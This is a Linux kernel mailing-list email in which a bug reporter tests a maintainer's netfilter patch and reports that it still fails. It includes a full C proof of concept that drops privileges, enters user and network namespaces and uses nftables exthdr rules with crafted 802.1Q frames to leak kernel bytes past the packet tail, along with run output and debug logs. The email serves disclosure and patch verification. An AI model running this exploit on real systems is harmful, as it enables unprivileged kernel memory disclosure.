Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.remote-ip=209.85.210.173
ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=fail;
	t=1795657429;
	b=qbsYW7NkBYMCgzY8X+rGPwoZy1O2GCwFkG4d6+WmhT7d0GiQ8PScnZWXDVEhdL+nQqcH
	 LHCKDkA4bizschUgjZ4u/VMF+/o4owgdDt/m7v2tiRRwnLXUyLtxrunyM/MWv9fKJY2q4
	 mOKvph0AW+EyHO+faDnj7Pbp+qInWW4Cr9ammO+iM6VIaD+RNUgCtboIB+XbxUwg30n8N
	 Q4DYv1awAObKs5kYiKPlsUqRPhI9ICxtKyJDfFU5YBt5l4uXma7WzlzfMgSUPeOVegl3n
	 zLUl/2nezRZ7I2VKJ84DG2eaB0parH1mRZspLPzF2lbjn3NJxRs4fraB1xYU7jZng/Q==
ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795657429;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:
	 MIME-Version:References:In-Reply-To:From:Date:X-Gm-Features:
	 Message-ID:Subject:To:Cc:Content-Type:Content-Transfer-Encoding;
	bh=p2OMwSAupKVnOVH1s6/p9acTAXNTJP7ZElVm7AVIKZU=;
	b=JbqfzXBVToECVgT1ywlcy6PnwUGArMDD26E9tgjfT6u3phiSKEekX0m7pUZbBuerZBUc
	 3dPIkfivsVatVAoISlBMn+X3/hIt1k9pfAebaS3CERSb1+y8pkB3s5686ALX2WTjyUZ68
	 rVRF8F7YjcFdBAKDh+Vwhxc40peCJJjd1FU8pr3Gf/BALh08PKokamEbhVX/d3840aFWS
	 Xzy7DXHoAQeBZTbjmGMjX4Bt/q37x6k88YoDWr3po9r8HudpX/o4Bi5/broxMNgyZCBVy
	 359h5JcXvQ/tIa+2fdNSG5zIrirwMYPRXnwZz5m+rkF/F9m9M+XMLyuyE1D1r+GXC4w==
ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
	dmarc=pass header.from=asu.edu;
	spf=pass smtp.mailfrom=asu.edu;
	dkim=pass header.d=asu.edu header.i=@asu.edu header.a=rsa-sha256 header.s=google header.b=WuO0vfoq;
	arc=fail smtp.remote-ip=209.85.210.173
Received: from mail-pf1-f173.google.com (mail-pf1-f173.google.com [209.85.210.173])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 422CE606A326
	for <netfilter-devel@vger.kernel.org>; Thu, 26 Nov 2026 01:43:48 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 422CE606A326
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.a=rsa-sha256 header.s=google header.b=WuO0vfoq
Received: by mail-pf1-f173.google.com with SMTP id d2e1a72fcca58-8b612fd74e1so2271930b3a.0
        for <netfilter-devel@vger.kernel.org>; Wed, 25 Nov 2026 17:43:48 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; t=1795657427; cv=none;
        d=google.com; s=arc-20260327;
        b=PmJ2cphNucCgtqAeh3yBGMfKlEqLG38QqJH1Z5HSAlvruq2iHr4oQqILpLe7JKxOMW
         mEvwg2aIdr5tsPTNlDEpfbDvViZ3KiyVbYboOs6UkqGH8xBLmbEc/JOt9/q04U45GmVS
         hSToQ6OYPC4/VbvXDy1S+2ZTAMzY8d68A+PH2A443k/bmGkf03D0TnGtusw7ZlgyMwum
         h/U9CAKGJ/cU9VoM89B6KpcrZ6NDmgqjrRu6EsUzwoh61V1K2H6FqFlTRc4N1myCLw7b
         crOJGSwMNjNORSmIcZkq7K5N3lQ04PL2Ma6wzA2fb0jaMgpLRfbx+eYtAjj7OOTu3mUE
         zSJg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=p2OMwSAupKVnOVH1s6/p9acTAXNTJP7ZElVm7AVIKZU=;
        fh=vxUJI5jonQe91pwu2muoEaAyUTLSLhB3kss8OlmxsJQ=;
        b=fqjHpLB/UsrJn+hrw6ZhnzaZjl+khMxCP6YWGqfB2GSMIcLubtDug4cx/aoIFy0gtV
         iOaTHo4G+752/QZSwL4Z+P0Up75C8W/KAPHRJKL4SbYOC5d5YP1cT4A2AB4XMM655Uu0
         vamfitHQFMDMZwFpMnlXWJtyNPWU2RKJ44srhu2W3/bbJxinGEPR/LXlaT/IhD2qVZHM
         bpEcJ9GCCkmLMu+JhJOWyFU4SgHlF1B/aJT3WcyLGG5vANvHGOuNPUkF7wMXeTDR6ghf
         JDWEgT1xa7XyYK08Z4cVWZxlHx8Ex7jkPVuTmKskDWZsJVoQmoCr+k+Flvg9zxWInzWo
         Ldnw==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1795657427; x=1796262227; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=p2OMwSAupKVnOVH1s6/p9acTAXNTJP7ZElVm7AVIKZU=;
        b=WuO0vfoqneHPV9Z3jSLAEfh29woufCypa+poQVo9zpbU21ti12gFv1hu9sb+HIs2X4
         ewhJ/de5sOwSHVmUtKUJNReepHNlZOoNWQHwfS/E0y5EAgVFrqXPm6oXx0Tj9d7E7SYF
         zP7ROEfxW7OG0NtsyZJKrCtNWLy+LKvbl2HpNVTTuKajUOeiGGXTdsQSRoahlxHSH+vu
         rnS5Rz4swXu7uu1n9oueMJ4xJTdBDjEMs8Mp49xjQ9BO9jv1js4RyVHzEIu2dAfRARTM
         hoEyJlHKM7tgGHi+QLL1naKBgXaW0cCqmbDR9ednHREKGH+omJKS9PANJV9X6QJkArNp
         Arhg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1795657427; x=1796262227;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=p2OMwSAupKVnOVH1s6/p9acTAXNTJP7ZElVm7AVIKZU=;
        b=xOQEJkex7U6thoBcwP0HyK1/6vXcJDy1T3XJ1EVWRlH5eCqvyuMue1/GuXvj8HDhz7
         gYa01Rh44/nk1iuUkNLGBpJMf/yu3hoWbZGb+8lVdhOFh4ggTIbFkU2yv9Dry43bw+7H
         TfvrGS7sC1q7csLyQnvASAPD9pgY4NdixPp3zgF63Snz3e3CrDMRujeg/EUn9Q8MyqB2
         Tc+hX6bUsryxa0JP27c05ifzqfn/AHFMIzEJsydVAVrO9rOCTGb/ztoGuGdCUudWeiru
         uX+h3iVB0kyZ0F8CP/lEsIwK/8ybovPWg54GP0kMeOl9/GBkJSY1PZjTwJ6vnRS2lSHl
         OCjw==
X-Forwarded-Encrypted: i=1; AL+hErE9Pvisk+vr3HlmnQAZuFGs9+WaoIOQHZwsd3UFnhdoS5SnqkWLd6WlEEKSsACbFXixOQNzPbvG38repwSHPKM=@vger.kernel.org
X-Gm-Message-State: APuU4Z+ivZKIhGiBrktdhW06NwtIM4qsXjiwdZ7SDv5AcRGpefFbbNdH
	8k5EPVk4u1h3TZQCWkWpl1O3hR2hsDyo0H+x5VGviikh6jFfLSRUuao2+q5/n4adv0HejzhhxZb
	7//fa73SeHGT14YmcwZ0UJPPNur+TnuazvHS8bQ0m
X-Gm-Gg: AZFdTZfF077mIzL4YVBz4cfH9gIlJjyytJnBuNHbKrFvbGx0pWV1HsHLpTi60kN8IIN
	qOr0pp1oJVB5qGcswgPF2zrP3i4IXeTGTaGCi0Bq2VVaur0zHjkO6RTkO27K8Xmg5SsYqHGXL7M
	WCdFiASev44YwwgKwdopFGi5EVIMY8jub63hFarbLBTCu4OmJg6AIIOUdxTHpOtoaw9tzfIrIb/
	3T1uF4Kb3sA+KeFzqRir2BzOmrYT/cGCS1oPulLFdDhv6O4rQidF6WXv0tvWBDNbnkI3uJScQKd
	EUz80SIkYzUdMPCa2iP8ukWorimHKSxwmK3OB0Qi01ygKEaQhfStizGFsxO+PbqQYbpo8977Rmm
	BwYgHG+rnCyAjxNYB74Ft4YWsgi4vFKTmvTZwgpLteC7EXAlaOVdTtc3vRVfuoGc6pGKZ
X-Received: by 2002:a05:6a21:6812:b0:3e2:8c31:21cf with SMTP id
 adf61e73a8af0-4014de5bd25mr18196958637.76.1795657427468; Wed, 25 Nov 2026
 17:43:47 -0800 (PST)
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Post: <mailto:netfilter-devel@vger.kernel.org>
List-Help: <mailto:netfilter-devel+help@vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netfilter-devel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
References: <20261126001151.13793-1-xmei5@asu.edu> <awd9f47inahmDWRP@chamomile>
 <awd_r2mOR7xuYzh4@chamomile>
In-Reply-To: <awd_r2mOR7xuYzh4@chamomile>
From: Xiang Mei <xmei5@asu.edu>
Date: Wed, 25 Nov 2026 18:43:35 -0700
X-Gm-Features: Aa3M54racRdDiyseUzP7YgMzwacaYGswv7XwTiacCaigXQhxDeGIF2fGevwvleI
Message-ID: <CAPpSM+TTd7sQvAjDS_u69xLNwtPgFrr23dxi8yKgRPfqosfjUQ@mail.gmail.com>
Subject: Re: [PATCH nf] netfilter: nft_exthdr: pull the IPv6 header before ipv6_find_hdr()
To: Pablo Neira Ayuso <pablo@netfilter.org>
Cc: Florian Westphal <fw@strlen.de>, Phil Sutter <phil@nwl.cc>, "David S. Miller" <davem@davemloft.net>, 
	Eric Dumazet <edumazet@kernel.org>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, 
	Willem de Bruijn <willemb@google.com>, Simon Horman <horms@kernel.org>, netfilter-devel@vger.kernel.org, 
	coreteam@netfilter.org, netdev@vger.kernel.org, linux-kernel@vger.kernel.org, 
	stable@vger.kernel.org, co+85229ab197510ca7@bugs.sh
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Wed, Nov 25, 2026 at 5:39=E2=80=AFPM Pablo Neira Ayuso <pablo@netfilter.=
org> wrote:
>
> On Thu, Nov 26, 2026 at 01:29:55AM +0100, Pablo Neira Ayuso wrote:
> > On Wed, Nov 25, 2026 at 05:11:51PM -0700, Xiang Mei wrote:
> [...]
> > > Pull the header before the call, as act_ct, virtio_net_hdr_to_skb() a=
nd
> > > nft_set_pktinfo_ipv6_ingress() already do.
>
> I prefer this patch (see attachment).
>
> Please, don't take, I will submit it myself including your
> Reported-by: tag.
>
> Thanks.

Sorry, I replied only to Pablo earlier. A resend of my test:

Thanks for the patch. I have just tested it agaist the PoC (attached to
this mail) but it still leaks.

The 18-byte 802.1Q frame still makes ipv6_find_hdr() read past the
tail, same as the unpatched kernel. The pull in validate fails, we
fall back to nft_set_pktinfo_unspec(), and nft_do_chain_netdev() still
runs the chain, so exthdr gets called with only the skb->protocol
check.

I think exthdr still needs its own check, or the netdev/bridge chains
should not evaluate rules against an skb that failed validation. Your
change still looks useful on top of that for the frags case.

One more thing: nft_meta.c calls __nft_set_pktinfo_ipv6_validate()
with a non-zero nhoff for VLAN/PPPoE, but the new code pulls and reads
the header at offset 0, so it checks the outer header there.

Thanks,
Xiang

The PoC:
```c
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <grp.h>
#include <sys/prctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

#define NFNL_SUBSYS_NFTABLES    10
#define NFNL_MSG_BATCH_BEGIN    16
#define NFNL_MSG_BATCH_END      17
#define NFT_MSG_NEWTABLE        0
#define NFT_MSG_NEWCHAIN        3
#define NFT_MSG_NEWRULE         6
#define NFT_MSG_GETRULE         7
#define NFTA_TABLE_NAME         1
#define NFTA_CHAIN_TABLE        1
#define NFTA_CHAIN_NAME         3
#define NFTA_CHAIN_HOOK         4
#define NFTA_CHAIN_TYPE         7
#define NFTA_HOOK_HOOKNUM       1
#define NFTA_HOOK_PRIORITY      2
#define NFTA_HOOK_DEV           3
#define NFTA_RULE_TABLE         1
#define NFTA_RULE_CHAIN         2
#define NFTA_RULE_EXPRESSIONS   4
#define NFTA_RULE_USERDATA      7
#define NFTA_LIST_ELEM          1
#define NFTA_EXPR_NAME          1
#define NFTA_EXPR_DATA          2
#define NFTA_EXTHDR_DREG        1
#define NFTA_EXTHDR_TYPE        2
#define NFTA_EXTHDR_OFFSET      3
#define NFTA_EXTHDR_LEN         4
#define NFTA_EXTHDR_FLAGS       5
#define NFT_EXTHDR_F_PRESENT    1
#define NFTA_CMP_SREG           1
#define NFTA_CMP_OP             2
#define NFTA_CMP_DATA           3
#define NFTA_DATA_VALUE         1
#define NFTA_COUNTER_PACKETS    2
#define NFPROTO_NETDEV          5
#define NFT_REG_1               1
#ifndef NETLINK_NETFILTER
#define NETLINK_NETFILTER       12
#endif

#define ROUNDS          64

struct nfgen { uint8_t family, version; uint16_t res_id; };

static int nl, pfd, ifi;
static uint32_t seq =3D 1;
static uint64_t cnt[256];

static void die(const char *m) { fprintf(stderr, "[-] %s: %s\n", m,
strerror(errno)); exit(1); }

static char *put(char *p, int type, const void *d, int len)
{
        struct nlattr *a =3D (struct nlattr *)p;

        a->nla_type =3D type;
        a->nla_len =3D NLA_HDRLEN + len;
        memcpy(p + NLA_HDRLEN, d, len);
        memset(p + NLA_HDRLEN + len, 0, NLA_ALIGN(len) - len);
        return p + NLA_ALIGN(a->nla_len);
}
static char *put_str(char *p, int t, const char *s) { return put(p, t,
s, strlen(s) + 1); }
static char *put_be32(char *p, int t, uint32_t v) { v =3D htonl(v);
return put(p, t, &v, 4); }
static char *nest(char **p, int type)
{
        struct nlattr *a =3D (struct nlattr *)*p;

        a->nla_type =3D type | NLA_F_NESTED;
        *p +=3D NLA_HDRLEN;
        return (char *)a;
}
static void nest_end(char *a, char *p) { ((struct nlattr *)a)->nla_len
=3D p - a; }

/* ---------------------------------------------------------------- setup *=
/

static void write_file(const char *path, const char *s)
{
        int fd =3D open(path, O_WRONLY);

        if (fd < 0 || write(fd, s, strlen(s)) < 0)
                die(path);
        close(fd);
}

static void enter_ns(void)
{
        char map[32];
        uid_t uid =3D getuid();
        gid_t gid =3D getgid();

        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
                die("unshare");
        write_file("/proc/self/setgroups", "deny");
        snprintf(map, sizeof(map), "0 %d 1", uid);
        write_file("/proc/self/uid_map", map);
        snprintf(map, sizeof(map), "0 %d 1", gid);
        write_file("/proc/self/gid_map", map);
}

static void rtnl_veth(void)
{
        char buf[512] =3D {}, *p, *li, *id, *peer;
        struct nlmsghdr *h =3D (struct nlmsghdr *)buf;
        int fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);

        h->nlmsg_type =3D RTM_NEWLINK;
        h->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
        p =3D (char *)NLMSG_DATA(h) + NLMSG_ALIGN(sizeof(struct ifinfomsg))=
;
        p =3D put_str(p, IFLA_IFNAME, "vp0");
        li =3D nest(&p, IFLA_LINKINFO);
        p =3D put(p, IFLA_INFO_KIND, "veth", 4);
        id =3D nest(&p, IFLA_INFO_DATA);
        peer =3D nest(&p, 1 /* VETH_INFO_PEER */);
        p +=3D sizeof(struct ifinfomsg);
        p =3D put_str(p, IFLA_IFNAME, "vp1");
        nest_end(peer, p);
        nest_end(id, p);
        nest_end(li, p);
        h->nlmsg_len =3D p - buf;
        if (fd < 0 || send(fd, buf, h->nlmsg_len, 0) < 0)
                die("RTM_NEWLINK");
        close(fd);
}

static void link_up(const char *name)
{
        struct ifreq ifr =3D {};
        int fd =3D socket(AF_INET, SOCK_DGRAM, 0);

        strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
        if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
                die("SIOCGIFFLAGS");
        ifr.ifr_flags |=3D IFF_UP;
        if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
                die("SIOCSIFFLAGS");
        close(fd);
}

/* ------------------------------------------------------------- nftables *=
/

static char *msg(char *cur, int type, int flags)
{
        struct nlmsghdr *h =3D (struct nlmsghdr *)cur;
        struct nfgen *g =3D (struct nfgen *)NLMSG_DATA(h);

        memset(h, 0, NLMSG_HDRLEN + sizeof(*g));
        h->nlmsg_type =3D (NFNL_SUBSYS_NFTABLES << 8) | type;
        h->nlmsg_flags =3D NLM_F_REQUEST | flags;
        h->nlmsg_seq =3D ++seq;
        g->family =3D NFPROTO_NETDEV;
        return cur + NLMSG_HDRLEN + sizeof(*g);
}
static char *msg_end(char *cur, char *p) { ((struct nlmsghdr
*)cur)->nlmsg_len =3D p - cur; return p; }
static char *batch(char *cur, int type)
{
        struct nlmsghdr *h =3D (struct nlmsghdr *)cur;
        struct nfgen *g =3D (struct nfgen *)NLMSG_DATA(h);

        memset(h, 0, NLMSG_HDRLEN + sizeof(*g));
        h->nlmsg_type =3D type;
        h->nlmsg_flags =3D NLM_F_REQUEST;
        h->nlmsg_seq =3D ++seq;
        h->nlmsg_len =3D NLMSG_HDRLEN + sizeof(*g);
        g->res_id =3D htons(NFNL_SUBSYS_NFTABLES);
        return cur + h->nlmsg_len;
}

static void nft_commit(char *buf, char *end)
{
        char rb[8192];
        int n;

        if (send(nl, buf, end - buf, 0) < 0)
                die("nft send");
        while ((n =3D recv(nl, rb, sizeof(rb), MSG_DONTWAIT)) > 0) {
                struct nlmsghdr *r =3D (struct nlmsghdr *)rb;

                for (; NLMSG_OK(r, n); r =3D NLMSG_NEXT(r, n)) {
                        struct nlmsgerr *e =3D (struct nlmsgerr *)NLMSG_DAT=
A(r);

                        if (r->nlmsg_type =3D=3D NLMSG_ERROR && e->error) {
                                errno =3D -e->error;
                                die("nft batch");
                        }
                }
        }
}

static char *rule(char *cur, int t)
{
        uint8_t ud =3D t, one =3D 1;
        char *p, *ex, *e, *d, *v;

        p =3D msg(cur, NFT_MSG_NEWRULE, NLM_F_CREATE | NLM_F_APPEND | NLM_F=
_ACK);
        p =3D put_str(p, NFTA_RULE_TABLE, "t");
        p =3D put_str(p, NFTA_RULE_CHAIN, "c");
        p =3D put(p, NFTA_RULE_USERDATA, &ud, 1);
        ex =3D nest(&p, NFTA_RULE_EXPRESSIONS);

        e =3D nest(&p, NFTA_LIST_ELEM);                   /* exthdr ipv6
type t exists */
        p =3D put_str(p, NFTA_EXPR_NAME, "exthdr");
        d =3D nest(&p, NFTA_EXPR_DATA);
        p =3D put_be32(p, NFTA_EXTHDR_DREG, NFT_REG_1);
        p =3D put(p, NFTA_EXTHDR_TYPE, &ud, 1);
        p =3D put_be32(p, NFTA_EXTHDR_OFFSET, 0);
        p =3D put_be32(p, NFTA_EXTHDR_LEN, 1);
        p =3D put_be32(p, NFTA_EXTHDR_FLAGS, NFT_EXTHDR_F_PRESENT);
        nest_end(d, p);
        nest_end(e, p);

        e =3D nest(&p, NFTA_LIST_ELEM);                   /* cmp reg1 =3D=
=3D 1 */
        p =3D put_str(p, NFTA_EXPR_NAME, "cmp");
        d =3D nest(&p, NFTA_EXPR_DATA);
        p =3D put_be32(p, NFTA_CMP_SREG, NFT_REG_1);
        p =3D put_be32(p, NFTA_CMP_OP, 0 /* NFT_CMP_EQ */);
        v =3D nest(&p, NFTA_CMP_DATA);
        p =3D put(p, NFTA_DATA_VALUE, &one, 1);
        nest_end(v, p);
        nest_end(d, p);
        nest_end(e, p);

        e =3D nest(&p, NFTA_LIST_ELEM);                   /* counter */
        p =3D put_str(p, NFTA_EXPR_NAME, "counter");
        nest_end(e, p);

        nest_end(ex, p);
        return msg_end(cur, p);
}

static void nft_setup(void)
{
        static char buf[65536];
        char *cur, *p, *hk;
        int t =3D 0, i;

        nl =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
        if (nl < 0)
                die("NETLINK_NETFILTER");

        cur =3D batch(buf, NFNL_MSG_BATCH_BEGIN);
        p =3D msg(cur, NFT_MSG_NEWTABLE, NLM_F_CREATE | NLM_F_ACK);
        p =3D put_str(p, NFTA_TABLE_NAME, "t");
        cur =3D msg_end(cur, p);
        p =3D msg(cur, NFT_MSG_NEWCHAIN, NLM_F_CREATE | NLM_F_ACK);
        p =3D put_str(p, NFTA_CHAIN_TABLE, "t");
        p =3D put_str(p, NFTA_CHAIN_NAME, "c");
        p =3D put_str(p, NFTA_CHAIN_TYPE, "filter");
        hk =3D nest(&p, NFTA_CHAIN_HOOK);
        p =3D put_be32(p, NFTA_HOOK_HOOKNUM, 0 /* NF_NETDEV_INGRESS */);
        p =3D put_be32(p, NFTA_HOOK_PRIORITY, 0);
        p =3D put_str(p, NFTA_HOOK_DEV, "vp1");
        nest_end(hk, p);
        cur =3D msg_end(cur, p);
        cur =3D batch(cur, NFNL_MSG_BATCH_END);
        nft_commit(buf, cur);

        while (t < 256) {
                cur =3D batch(buf, NFNL_MSG_BATCH_BEGIN);
                for (i =3D 0; i < 32 && t < 256; i++)
                        cur =3D rule(cur, t++);
                cur =3D batch(cur, NFNL_MSG_BATCH_END);
                nft_commit(buf, cur);
        }
}

/* nf_tables dumps nests without NLA_F_NESTED, so walk the levels by hand *=
/
#define for_each_nla(x, a, len, rem)
         \
        for (x =3D (struct nlattr *)(a), rem =3D (len);
         \
            rem >=3D NLA_HDRLEN && x->nla_len >=3D NLA_HDRLEN &&
x->nla_len <=3D rem; \
            rem -=3D NLA_ALIGN(x->nla_len),
         \
            x =3D (struct nlattr *)((char *)x + NLA_ALIGN(x->nla_len)))
#define NLA_DATA(x)     ((char *)(x) + NLA_HDRLEN)
#define NLA_LEN(x)      ((x)->nla_len - NLA_HDRLEN)

/* rule -> userdata (T) and expressions/elem/data/COUNTER_PACKETS */
static void parse_rule(char *a, int len)
{
        struct nlattr *r, *el, *ex, *c;
        int r1, r2, r3, r4, t =3D -1;
        uint64_t pk =3D 0;

        for_each_nla(r, a, len, r1) {
                if (r->nla_type =3D=3D NFTA_RULE_USERDATA)
                        t =3D (uint8_t)NLA_DATA(r)[0];
                if (r->nla_type !=3D NFTA_RULE_EXPRESSIONS)
                        continue;
                for_each_nla(el, NLA_DATA(r), NLA_LEN(r), r2) {
                        bool counter =3D false;

                        for_each_nla(ex, NLA_DATA(el), NLA_LEN(el), r3) {
                                if (ex->nla_type =3D=3D NFTA_EXPR_NAME)
                                        counter =3D
!strcmp(NLA_DATA(ex), "counter");
                                else if (ex->nla_type =3D=3D
NFTA_EXPR_DATA && counter)
                                        for_each_nla(c, NLA_DATA(ex),
NLA_LEN(ex), r4)
                                                if (c->nla_type =3D=3D
NFTA_COUNTER_PACKETS)
                                                        pk =3D
be64toh(*(uint64_t *)NLA_DATA(c));
                        }
                }
        }
        if (t >=3D 0)
                cnt[t] =3D pk;
}

static void read_counters(void)
{
        static char rb[1 << 18];
        char buf[256], *p =3D msg(buf, NFT_MSG_GETRULE, NLM_F_DUMP);
        int n;

        p =3D put_str(p, NFTA_RULE_TABLE, "t");
        msg_end(buf, p);
        if (send(nl, buf, ((struct nlmsghdr *)buf)->nlmsg_len, 0) < 0)
                die("GETRULE");
        while ((n =3D recv(nl, rb, sizeof(rb), 0)) > 0) {
                struct nlmsghdr *r =3D (struct nlmsghdr *)rb;

                for (; NLMSG_OK(r, n); r =3D NLMSG_NEXT(r, n)) {
                        char *a =3D (char *)NLMSG_DATA(r) + sizeof(struct n=
fgen);

                        if (r->nlmsg_type =3D=3D NLMSG_DONE ||
r->nlmsg_type =3D=3D NLMSG_ERROR)
                                return;
                        parse_rule(a, (char *)r + r->nlmsg_len - a);
                }
        }
}

/* --------------------------------------------------------------- probes *=
/

static void tx(const unsigned char *f, int len, uint16_t proto)
{
        struct sockaddr_ll sll =3D {};

        sll.sll_family =3D AF_PACKET;
        sll.sll_ifindex =3D ifi;
        sll.sll_protocol =3D htons(proto);
        sll.sll_halen =3D ETH_ALEN;
        if (sendto(pfd, f, len, 0, (struct sockaddr *)&sll, sizeof(sll)) < =
0)
                die("sendto");
}

int main(void)
{
        unsigned char probe[18] =3D {
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x02, 0x02, 0x02,
0x02, 0x02, 0x02,
                0x81, 0x00,             /* ETH_P_8021Q */
                0x00, 0x64,             /* vid 100 */
                0x86, 0xdd,             /* inner: ETH_P_IPV6, then nothing =
*/
        };
        uint64_t before[256];
        cpu_set_t cs;
        int r, t, hit =3D 0;

        setvbuf(stdout, NULL, _IONBF, 0);
        CPU_ZERO(&cs);
        CPU_SET(0, &cs);
        sched_setaffinity(0, sizeof(cs), &cs);

        if (getuid() =3D=3D 0) {                    /* drop to an
unprivileged user */
                setgroups(0, NULL);
                if (setresgid(1000, 1000, 1000) || setresuid(1000, 1000, 10=
00))
                        die("drop privileges");
                prctl(PR_SET_DUMPABLE, 1);      /* lets us write our
own uid_map */
        }
        printf("[*] uid=3D%d\n", getuid());
        enter_ns();
        /* keep IPv6 autoconf traffic off the veths */
        write_file("/proc/sys/net/ipv6/conf/all/disable_ipv6", "1");
        write_file("/proc/sys/net/ipv6/conf/default/disable_ipv6", "1");
        rtnl_veth();
        link_up("vp0");
        link_up("vp1");
        nft_setup();

        pfd =3D socket(AF_PACKET, SOCK_RAW, 0);
        ifi =3D if_nametoindex("vp0");
        if (pfd < 0 || !ifi)
                die("AF_PACKET");


        printf("[*] sending %d 18-byte 802.1Q probes with no IPv6
header\n", ROUNDS);
        read_counters();
        memcpy(before, cnt, sizeof(before));
        for (r =3D 0; r < ROUNDS; r++) {
                tx(probe, sizeof(probe), ETH_P_8021Q);
                usleep(20000);
        }
        read_counters();
        for (t =3D 0; t < 256; t++) {
                if (cnt[t] =3D=3D before[t])
                        continue;
                printf("    rule 0x%02x fired %llu/%d: kernel read
byte 0x%02x past skb tail\n",
                      t, (unsigned long long)(cnt[t] - before[t]), ROUNDS, =
t);
                hit +=3D cnt[t] - before[t];
        }
        printf("[%c] %d/%d probes leaked a byte from past the end of
the packet\n",
              hit ? '+' : '-', hit, ROUNDS);
        return !hit;
}
```

My run output of your attached patch:
```log
[*] sending 64 18-byte 802.1Q probes with no IPv6 header
    rule 0x01 fired 25/64: kernel read byte 0x01 past skb tail
    rule 0x02 fired 2/64: kernel read byte 0x02 past skb tail
    rule 0x03 fired 1/64: kernel read byte 0x03 past skb tail
    rule 0x74 fired 1/64: kernel read byte 0x74 past skb tail
...
```

I also confirmed the same result after inserting some debug to the kernel.

```log
[    4.041624] DBG_OOB head=3Dffff888021df96c0 nh=3D20 tail=3D20 end=3D384
byte=3D0x00 ptr16_23(head+544)=3D0xdf
[    4.061809] DBG_OOB head=3Dffff888021df9a00 nh=3D20 tail=3D20 end=3D384
byte=3D0x00 ptr16_23(head+544)=3D0xdf
[    4.081970] DBG_OOB head=3Dffff888021df63c0 nh=3D20 tail=3D20 end=3D384
byte=3D0x00 ptr16_23(head+544)=3D0xdf
[    4.102192] DBG_OOB head=3Dffff888021df6080 nh=3D20 tail=3D20 end=3D384
byte=3D0x00 ptr16_23(head+544)=3D0xdf
[    4.122357] DBG_OOB head=3Dffff888021de5a00 nh=3D20 tail=3D20 end=3D384
byte=3D0x01 ptr16_23(head+544)=3D0xde
...
```
